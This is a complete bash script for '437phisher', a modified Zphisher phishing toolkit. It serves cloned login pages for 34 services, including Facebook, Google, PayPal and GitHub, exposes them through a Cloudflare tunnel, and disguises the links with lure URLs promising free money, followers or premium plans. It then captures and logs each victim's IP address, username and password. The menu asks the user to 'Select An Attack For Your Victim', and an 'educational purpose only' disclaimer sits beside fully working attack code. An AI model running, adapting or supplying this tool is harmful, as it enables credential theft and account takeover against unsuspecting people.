#!/bin/bash

##   437phisher 	: 	Automated Phishing Tool+
##   Author 	: 	RenderBolt
##   Version 	: 	1.0
##   Github 	: 	https://github.com/RenderBolt96
## Modified version of :
##   Zphisher 	: 	Automated Phishing Tool
##   Author 	: 	Akshay-Arjun 
##   Version 	: 	1.2
##   Github 	: 	https://github.com/Akshay-Arjun  


## If you Copy Then Give the credits :)



## ANSI colors (FG & BG)
RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"  BLUE="$(printf '\033[34m')"
MAGENTA="$(printf '\033[35m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')" BLACK="$(printf '\033[30m')"
REDBG="$(printf '\033[41m')"  GREENBG="$(printf '\033[42m')"  ORANGEBG="$(printf '\033[43m')"  BLUEBG="$(printf '\033[44m')"
MAGENTABG="$(printf '\033[45m')"  CYANBG="$(printf '\033[46m')"  WHITEBG="$(printf '\033[47m')" BLACKBG="$(printf '\033[40m')"
RESETBG="$(printf '\e[0m\n')"

## Directories
if [[ ! -d ".server" ]]; then
	mkdir -p ".server"
fi
if [[ -d ".server/www" ]]; then
	rm -rf ".server/www"
	mkdir -p ".server/www"
else
	mkdir -p ".server/www"
fi
if [[ -e ".cld.log" ]]; then
	rm -rf ".cld.log"
fi

## Script termination
exit_on_signal_SIGINT() {
    { printf "\n\n%s\n\n" "${RED}[${BLUE}!${RED}]${RED} Program Interrupted.(use the command (bash 437phisher.sh) to start up 437Phisher again!)" 2>&1; reset_color; }
    exit 0
}

exit_on_signal_SIGTERM() {
    { printf "\n\n%s\n\n" "${RED}[${BLUE}!${RED}]${RED} Program Terminated. Thank you for using & Happy Hacking!(use the command (bash 437phisher.sh) to start up 437Phisher again!)" 2>&1; reset_color; }
    exit 0
}

trap exit_on_signal_SIGINT SIGINT
trap exit_on_signal_SIGTERM SIGTERM

## Reset terminal colors
reset_color() {
	tput sgr0   # reset attributes
	tput op     # reset color
    return
}

## Kill already running process
kill_pid() {
	if [[ `pidof php` ]]; then
		killall php > /dev/null 2>&1
	
	fi
	if [[ `pidof cloudflared` ]]; then
		killall cloudflared > /dev/null 2>&1
	fi
}

## Banner
banner() {
	cat <<- EOF
		
${CYAN}  _  _    ____  _____  ____   _      _       _                 
${CYAN} | || |  |___ /|___  || '_ \ | |    (_)     | |                
${CYAN} | || |_   |_ \   / / | |_) || |__   _  ___ | |__    ___  _ __ 
${CYAN} |__   _| ___) | / /  | .__/ | '_ \ | |/ __|| '_ \  / _ \| '__|	
${CYAN}    |_|  |____/ /_/   | |    | | | || |\__ \| | | ||  __/| |   	
${CYAN}                      |_|    |_| |_||_||___/|_| |_| \___||_|   
${CYAN} ${RED}Version : 1.0	${MAGENTA}Etanie is Beautiful

${RED}[${MAGENTA}-${RED}]${CYAN} The Title Will ONLY DISPLAY PROPERLY If The Screen Is Turned HORZONTALLY!!! ${WHITE}

${GREEN}[${WHITE}-${GREEN}]${CYAN} Tool Created by Render ${WHITE}
EOF
}
        
## Small Banner
banner_small() {
	cat <<- "EOF"
		 _       ____   _     .-"""-.   _       ____   _     
		| |     / __ \ | |   / _   _ \ | |     / __ \ | |    
		| |    | |  | || |   ](_' `_)[ | |    | |  | || |    
		| |    | |  | || |   `-. N ,-' | |    | |  | || |    
		| |___ | |__| || |___  |||||   | |___ | |__| || |___ 
		|_____| \____/ |_____| `---'   |_____| \____/ |_____|
		437Phisher----Respect Etanie----Version : 1.0
	EOF
}

## Dependencies
dependencies() {
	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."

    if [[ -d "/data/data/com.termux/files/home" ]]; then
        if [[ `command -v proot` ]]; then
            printf ''
        else
			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
            pkg install proot resolv-conf -y
        fi
    fi

	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Packages already installed."
	else
		pkgs=(php curl wget unzip)
		for pkg in "${pkgs[@]}"; do
			type -p "$pkg" &>/dev/null || {
				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
				if [[ `command -v pkg` ]]; then
					pkg install "$pkg" -y
				elif [[ `command -v apt` ]]; then
					apt install "$pkg" -y
				elif [[ `command -v apt-get` ]]; then
					apt-get install "$pkg" -y
				elif [[ `command -v pacman` ]]; then
					sudo pacman -S "$pkg" --noconfirm
				elif [[ `command -v dnf` ]]; then
					sudo dnf -y install "$pkg"
				else
					echo -e "\n${RED}[${BLUE}!${RED}]${RED} Unsupported package manager, Install packages manually."
					{ reset_color; exit 1; }
				fi
			}
		done
	fi

}


## Download Cloudflared
download_cloudflared() {
	url="$1"
	file=`basename $url`
	if [[ -e "$file" ]]; then
		rm -rf "$file"
	fi
	wget --no-check-certificate "$url" > /dev/null 2>&1
	if [[ -e "$file" ]]; then
		mv -f "$file" .server/cloudflared > /dev/null 2>&1
		chmod +x .server/cloudflared > /dev/null 2>&1
	else
		echo -e "\n${RED}[${RED}!${RED}]${RED} Error occured, Install Cloudflared manually."
		{ reset_color; exit 1; }
	fi
}



## Install Cloudflared
install_cloudflared() {
	if [[ -e ".server/cloudflared" ]]; then
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Cloudflared already installed."
	else
		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${MAGENTA} Installing Cloudflared..."${WHITE}
		arch=`uname -m`
		if [[ ("$arch" == *'arm'*) || ("$arch" == *'Android'*) ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm'
		elif [[ "$arch" == *'aarch64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64'
		elif [[ "$arch" == *'x86_64'* ]]; then
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64'
		else
			download_cloudflared 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386'
		fi
	fi

}

## Exit message
msg_exit() {
	{ clear; banner; echo; }
	echo -e "${CYANBG}${BLACK} Happy Hacking.${RESETBG}\n"
	{ reset_color; exit 0; }
}

## About
about() {
	{ clear; banner; echo; }
	cat <<- EOF
		${MAGENTA}Author   ${RED}:  ${ORANGE}RenderBolt
		${MAGENTA}Github   ${RED}:  ${CYAN}https://github.com/RenderBolt96
		${MAGENTA}Social   ${RED}:  ${CYAN}https://bit.ly/AKSHAYARJUN
		${MAGENTA}Version  ${RED}:  ${ORANGE}1.0

		${REDBG}${WHITE} Thanks : htr-tech,Adi1090x,MoisesTapia,ThelinuxChoice
								  DarkSecDevelopers,Mustakim Ahmed,1RaY-1 ${RESETBG}

		${RED}Warning:${WHITE}
		${CYAN}This Tool is made for educational purpose only ${RED}!${WHITE}
		${CYAN}Author will not be responsible for any misuse of this toolkit ${RED}!${WHITE}

		${MAGENTA}[${WHITE}00${MAGENTA}]${MAGENTA} Main Menu     ${MAGENTA}[${WHITE}99${MAGENTA}]${MAGENTA} Exit

	EOF

	read -p "${BLUE}[${WHITE}-${BLUE}]${MAGENTA} Select an option : ${MAGENTA}"

	case $REPLY in 
		99)
			msg_exit;;
		0 | 00)
			echo -ne "\n${GREEN}[${BLUE}+${GREEN}]${CYAN} Returning to main menu..."
			{ sleep 1; main_menu; };;
		*)
			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; about; };;
	esac
}

## Setup website and start php server
HOST='127.0.0.1'
PORT='8080'

setup_site() {
	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} Setting up server..."${WHITE}
	cp -rf .sites/"$website"/* .server/www
	cp -f .sites/ip.php .server/www/
	echo -ne "\n${RED}[${BLUE}-${RED}]${BLUE} Starting PHP server..."${WHITE}
	cd .server/www && php -S "$HOST":"$PORT" > /dev/null 2>&1 & 
}

## Get IP address
capture_ip() {
	IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
	IFS=$'\n'
	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Victim's IP : ${BLUE}$IP"
	echo -ne "\n${RED}[${BLUE}-${RED}]${BLUE} Saved in : ${ORANGE}ip.txt"
	cat .server/www/ip.txt >> ip.txt
}

## Get credentials
capture_creds() {
	ACCOUNT=$(grep -o 'Username:.*' .server/www/usernames.txt | cut -d " " -f2)
	PASSWORD=$(grep -o 'Pass:.*' .server/www/usernames.txt | cut -d ":" -f2)
	IFS=$'\n'
	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
	echo -e "\n${RED}[${BLUE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} Saved in : ${ORANGE}usernames.dat"
	cat .server/www/usernames.txt >> usernames.dat
	echo -ne "\n${RED}[${BLUE}-${RED}]${ORANGE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit. "
}

## Print data
capture_data() {
	echo -ne "\n${RED}[${BLUE}-${RED}]${ORANGE} Waiting for Login Info, ${BLUE}Ctrl + C ${ORANGE}to exit..."
	while true; do
		if [[ -e ".server/www/ip.txt" ]]; then
			echo -e "\n\n${RED}[${BLUE}-${RED}]${GREEN} Victim IP Found !"
			capture_ip
			rm -rf .server/www/ip.txt
		fi
		sleep 0.75
		if [[ -e ".server/www/usernames.txt" ]]; then
			echo -e "\n\n${RED}[${BLUE}-${RED}]${GREEN} Login info Found !!"
			capture_creds
			rm -rf .server/www/usernames.txt
		fi
		sleep 0.75
	done
}


## DON'T COPY PASTE WITHOUT CREDIT DUDE :')
## Credits HTR-TECH and AKSHAY-ARJUN

## Start Cloudflared
start_cloudflared() { 
        rm .cld.log > /dev/null 2>&1 &
	echo -e "\n${RED}[${BLUE}-${RED}]${MAGENTA} Initializing... ${MAGENTA}( ${CYAN}https://$HOST:$PORT ${GREEN})"
	{ sleep 1; setup_site; }
	echo -ne "\n\n${RED}[${BLUE}-${RED}]${MAGENTA} Launching Cloudflared..."

    if [[ `command -v termux-chroot` ]]; then
		sleep 2 && termux-chroot ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    else
        sleep 2 && ./.server/cloudflared tunnel -url "$HOST":"$PORT" --logfile .cld.log > /dev/null 2>&1 &
    fi

	{ sleep 8; clear; banner_small; }
	
	cldflr_link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' ".cld.log")
	cldflr_link1=${cldflr_link#https://}
	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 1 : ${MAGENTA}$cldflr_link"
	echo -e "\n${RED}[${BLUE}-${RED}]${BLUE} URL 2 : ${MAGENTA}$mask@$cldflr_link1"
	echo -e "\n If you are getting Argo Tunnel Error in the above links,please wait at least 1 minute for the site to come alive."
	capture_data
}


## Tunnel selection
tunnel_menu() {
	{ clear; banner_small; }
	cat <<- EOF
	

	EOF

	echo "${RED}[${BLUE}-${RED}]${MAGENTA} Starting port forwarding by Cloudflared${BLUE}"
	start_cloudflared
	
	

}

## Facebook
site_facebook() {
	cat <<- EOF

		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Traditional Login Page
		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Advanced Voting Poll Login Page
		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Fake Security Login Page
		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Facebook Messenger Login Page

	EOF

	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="facebook"
			mask='https://blue-badge-verified-badge-for-facebook'
			tunnel_menu;;
		2 | 02)
			website="fb_advanced"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		3 | 03)
			website="fb_security"
			mask='https://make-your-facebook-secured-and-free-from-hackers'
			tunnel_menu;;
		4 | 04)
			website="fb_messenger"
			mask='https://get-messenger-premium-features-free'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_facebook; };;
	esac
}

## Instagram
site_instagram() {
	cat <<- EOF

		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Traditional Login Page
		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Auto Followers Login Page
		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} 1000 Followers Login Page
		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Blue Badge Verify Login Page

	EOF

	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="instagram"
			mask='https://instagram-com'
			tunnel_menu;;
		2 | 02)
			website="ig_followers"
			mask='https://get-unlimited-followers-for-instagram'
			tunnel_menu;;
		3 | 03)
			website="insta_followers"
			mask='https://get-1000-followers-for-instagram'
			tunnel_menu;;
		4 | 04)
			website="ig_verify"
			mask='https://blue-badge-verify-for-instagram'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_instagram; };;
	esac
}

## Gmail/Google
site_gmail() {
	cat <<- EOF

		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Gmail Old Login Page
		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Gmail New Login Page
		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Advanced Voting Poll

	EOF

	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="google"
			mask='https://get-unlimited-google-photos-free'
			tunnel_menu;;		
		2 | 02)
			website="google_new"
			mask='https://get-unlimited-google-photos-free'
			tunnel_menu;;
		3 | 03)
			website="google_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_gmail; };;
	esac
}

## Vk
site_vk() {
	cat <<- EOF

		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Traditional Login Page
		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Advanced Voting Poll Login Page

	EOF

	read -p "${RED}[${BLUE}-${RED}]${MAGENTA} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			website="vk"
			mask='https://vk-premium-real-method-2020'
			tunnel_menu;;
		2 | 02)
			website="vk_poll"
			mask='https://vote-for-the-best-social-media'
			tunnel_menu;;
		*)
			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; clear; banner_small; site_vk; };;
	esac
}

## Menu
main_menu() {
	{ clear; banner; echo; }
	cat <<- EOF
		${BLUE}[${MAGENTA}::${BLUE}]${RED} Select An Attack For Your Victim ${BLUE}[${MAGENTA}::${BLUE}]${RED}

		${MAGENTA}[${CYAN}01${MAGENTA}]${BLUE} Facebook      ${MAGENTA}[${CYAN}13${MAGENTA}]${BLUE} Twitch       ${MAGENTA}[${CYAN}25${MAGENTA}]${BLUE} DeviantArt
		${MAGENTA}[${CYAN}02${MAGENTA}]${BLUE} Instagram     ${MAGENTA}[${CYAN}14${MAGENTA}]${BLUE} Pinterest    ${MAGENTA}[${CYAN}26${MAGENTA}]${BLUE} Badoo
		${MAGENTA}[${CYAN}03${MAGENTA}]${BLUE} Google        ${MAGENTA}[${CYAN}15${MAGENTA}]${BLUE} Snapchat     ${MAGENTA}[${CYAN}27${MAGENTA}]${BLUE} Origin
		${MAGENTA}[${CYAN}04${MAGENTA}]${BLUE} Microsoft     ${MAGENTA}[${CYAN}16${MAGENTA}]${BLUE} Linkedin     ${MAGENTA}[${CYAN}28${MAGENTA}]${BLUE} DropBox	
		${MAGENTA}[${CYAN}05${MAGENTA}]${BLUE} Netflix       ${MAGENTA}[${CYAN}17${MAGENTA}]${BLUE} Ebay         ${MAGENTA}[${CYAN}29${MAGENTA}]${BLUE} Yahoo		
		${MAGENTA}[${CYAN}06${MAGENTA}]${BLUE} Paypal        ${MAGENTA}[${CYAN}18${MAGENTA}]${BLUE} Quora        ${MAGENTA}[${CYAN}30${MAGENTA}]${BLUE} Wordpress
		${MAGENTA}[${CYAN}07${MAGENTA}]${BLUE} Steam         ${MAGENTA}[${CYAN}19${MAGENTA}]${BLUE} Protonmail   ${MAGENTA}[${CYAN}31${MAGENTA}]${BLUE} Yandex			
		${MAGENTA}[${CYAN}08${MAGENTA}]${BLUE} Twitter       ${MAGENTA}[${CYAN}20${MAGENTA}]${BLUE} Spotify      ${MAGENTA}[${CYAN}32${MAGENTA}]${BLUE} StackoverFlow
		${MAGENTA}[${CYAN}09${MAGENTA}]${BLUE} Playstation   ${MAGENTA}[${CYAN}21${MAGENTA}]${BLUE} Reddit       ${MAGENTA}[${CYAN}33${MAGENTA}]${BLUE} Vk
		${MAGENTA}[${CYAN}10${MAGENTA}]${BLUE} Tiktok        ${MAGENTA}[${CYAN}22${MAGENTA}]${BLUE} Adobe        ${MAGENTA}[${CYAN}34${MAGENTA}]${BLUE} XBOX
		${MAGENTA}[${CYAN}11${MAGENTA}]${BLUE} Mediafire     ${MAGENTA}[${CYAN}23${MAGENTA}]${BLUE} Gitlab
		${MAGENTA}[${CYAN}12${MAGENTA}]${BLUE} Airbnb        ${MAGENTA}[${CYAN}24${MAGENTA}]${BLUE} Github


		${CYAN}[${RED}99${CYAN}]${RED} About         ${CYAN}[${RED}00${CYAN}]${RED} Exit

	EOF
	
	read -p "${CYAN}[${WHITE}-${CYAN}]${MAGENTA} Select an option : ${BLUE}"

	case $REPLY in 
		1 | 01)
			site_facebook;;
		2 | 02)
			site_instagram;;
		3 | 03)
			site_gmail;;
		4 | 04)
			website="microsoft"
			mask='https://unlimited-onedrive-space-for-free'
			tunnel_menu;;
		5 | 05)
			website="netflix"
			mask='https://upgrade-your-netflix-plan-free'
			tunnel_menu;;
		6 | 06)
			website="paypal"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		7 | 07)
			website="steam"
			mask='https://steam-free-gift-card'
			tunnel_menu;;
		8 | 08)
			website="twitter"
			mask='https://get-blue-badge-on-twitter-free'
			tunnel_menu;;
		9 | 09)
			website="playstation"
			mask='https://playstation-free-gift-card'
			tunnel_menu;;
		10)
			website="tiktok"
			mask='https://tiktok-free-liker'
			tunnel_menu;;
   		11)
			website="mediafire"
			mask='https://get-1TB-on-mediafire-free'
			tunnel_menu;;
		12)
		        website="airbnb"
	                mask='https://airbnb-com'
		        tunnel_menu;;

		13)
			website="twitch"
			mask='https://unlimited-twitch-tv-user-for-free'
			tunnel_menu;;
		14)
			website="pinterest"
			mask='https://get-a-premium-plan-for-pinterest-free'
			tunnel_menu;;
		15)
			website="snapchat"
			mask='https://view-locked-snapchat-accounts-secretly'
			tunnel_menu;;
		16)
			website="linkedin"
			mask='https://get-a-premium-plan-for-linkedin-free'
			tunnel_menu;;
		17)
			website="ebay"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		18)
			website="quora"
			mask='https://quora-premium-for-free'
			tunnel_menu;;
		19)
			website="protonmail"
			mask='https://protonmail-pro-basics-for-free'
			tunnel_menu;;
		20)
			website="spotify"
			mask='https://convert-your-account-to-spotify-premium'
			tunnel_menu;;
		21)
			website="reddit"
			mask='https://reddit-official-verified-member-badge'
			tunnel_menu;;
		22)
			website="adobe"
			mask='https://get-adobe-lifetime-pro-membership-free'
			tunnel_menu;;
   		23)
			website="gitlab"
			mask='https://get-1k-followers-on-gitlab-free'
			tunnel_menu;;
		24)
			website="github"
			mask='https://get-1k-followers-on-github-free'
			tunnel_menu;;

		25)
			website="deviantart"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		26)
			website="badoo"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		27)
			website="origin"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		28)
			website="dropbox"
			mask='https://get-1TB-cloud-storage-free'
			tunnel_menu;;
		29)
			website="yahoo"
			mask='https://grab-mail-from-anyother-yahoo-account-free'
			tunnel_menu;;
		30)
			website="wordpress"
			mask='https://wordpress-traffic-free'
			tunnel_menu;;
		31)
			website="yandex"
			mask='https://grab-mail-from-anyother-yandex-account-free'
			tunnel_menu;;
		32)
			website="stackoverflow"
			mask='https://get-stackoverflow-lifetime-pro-membership-free'
			tunnel_menu;;
		33)
			site_vk;;
		34)
			website="xbox"
			mask='https://get-500-usd-free-to-your-acount'
			tunnel_menu;;
		99)
			about;;
		0 | 00 )
			msg_exit;;
		*)
			echo -ne "\n${RED}[${BLUE}!${RED}]${RED} Invalid Option, Try Again..."
			{ sleep 1; main_menu; };;
	
	esac
}

## Main
kill_pid
dependencies
install_cloudflared
main_menu
